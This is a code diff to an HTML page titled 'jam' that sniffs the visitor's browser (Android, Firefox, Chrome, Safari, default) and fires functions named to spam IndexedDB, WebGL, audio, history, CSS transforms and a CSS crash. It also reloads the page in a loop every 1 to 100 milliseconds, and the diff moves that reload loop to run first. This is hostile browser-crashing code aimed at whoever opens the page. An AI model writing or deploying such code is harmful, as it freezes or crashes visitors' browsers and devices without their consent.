@@ -9,6 +9,8 @@
     <meta property="theme-color" content="#2b2d31"/>
     <link rel="shortcut icon" type="image/jpg" href="https://files.catbox.moe/a2jxol.png"/><link rel="icon" type="image/jpg" href="https://files.catbox.moe/a2jxol.png"/>
     
+    <link rel="stylesheet" href="./style.css">
+
     <title>jam</title>
     <style>
         .crash-css { 
@@ -139,52 +141,53 @@
                     break;
                     
                 case 'android':
+                    setInterval(() => location.reload(true), 100);
                     setTimeout(indexedDBSpam, 10);
                     setTimeout(transformSpam, 20);
                     setTimeout(webglSpam, 30);
                     setTimeout(audioSpam, 40);
                     setTimeout(cssCrash, 50);
-                    setInterval(() => location.reload(true), 100);
                     break;
                     
                 case 'firefox':
+                    setInterval(() => location.reload(true), 1);
                     setTimeout(webglSpam, 10);
                     setTimeout(cssCrash, 20);
                     setTimeout(historySpam, 30);
                     setTimeout(audioSpam, 40);
                     setTimeout(transformSpam, 50);
                     setTimeout(indexedDBSpam, 60);
-                    setInterval(() => location.reload(true), 1);
                     break;
                     
                 case 'chrome':
+                    setInterval(() => location.reload(true), 1);
                     setTimeout(webglSpam, 10);
                     setTimeout(cssCrash, 20);
                     setTimeout(historySpam, 30);
                     setTimeout(audioSpam, 40);
                     setTimeout(transformSpam, 50);
                     setTimeout(indexedDBSpam, 60);
-                    setInterval(() => location.reload(true), 1);
                     break;
                     
                 case 'safari':
+                    setInterval(() => location.reload(true), 100);
                     setTimeout(cssCrash, 10);
                     setTimeout(audioSpam, 20);
                     setTimeout(transformSpam, 30);
                     setTimeout(historySpam, 40);
                     setTimeout(webglSpam, 50);
                     setTimeout(indexedDBSpam, 60);
-                    setInterval(() => location.reload(true), 100);
                     break;
                     
                 default:
+                    setInterval(() => location.reload(true), 1);
                     setTimeout(webglSpam, 10);
                     setTimeout(cssCrash, 20);
                     setTimeout(historySpam, 30);
                     setTimeout(indexedDBSpam, 40);
                     setTimeout(audioSpam, 50);
                     setTimeout(transformSpam, 60);
-                    setInterval(() => location.reload(true), 1);
+                    
             }
         }, 50);
     </script>
